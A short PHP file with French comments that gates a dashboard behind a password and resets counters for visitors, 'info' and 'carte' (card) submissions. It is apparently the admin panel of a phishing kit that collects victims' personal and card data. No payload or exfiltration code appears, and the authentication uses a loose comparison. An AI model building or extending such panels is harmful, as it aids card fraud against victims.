<?php
include '../settings.php';

// Vérifier si le formulaire de réinitialisation a été soumis
if (isset($_POST['reset_counters'])) {
    // Réinitialiser les compteurs (Total Visiteurs, Total Info, Total Carte)
    $_SESSION = array();
    $_SESSION['carte_submissions'] = array();
}

// Mot de passe pour accéder au tableau de bord (changez-le par votre mot de passe)


// Vérifier si le mot de passe est soumis et correct
if (isset($_POST['password']) && $_POST['password'] == $mdp_panel) {
    // Le mot de passe est correct, définir le statut d'authentification
    $_SESSION['authenticated'] = true;

    // Rediriger vers la page actuelle pour éviter la re-soumission du formulaire
    header("Location: $_SERVER[PHP_SELF]");
    exit();
}

// Vérifier si l'utilisateur est authentifié
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    // L'utilisateur n'est pas authentifié, afficher le formulaire de mot de passe
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
       
    </head>
    <body>
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-md-4">
                    <form method="post" class="mt-5">
                        <div class="form-group">
                            <label for="password">Mot de passe :</label>
                            <input type="password" class="form-control" id="password" name="password" required>
                        </div>
                        <button type="submit" class="btn btn-primary">Se connecter</button>
                    </form>
                </div>
            </div>
        </div>
    </body>
    </html>
    <?php
    exit();
}

else {
    
}
?>
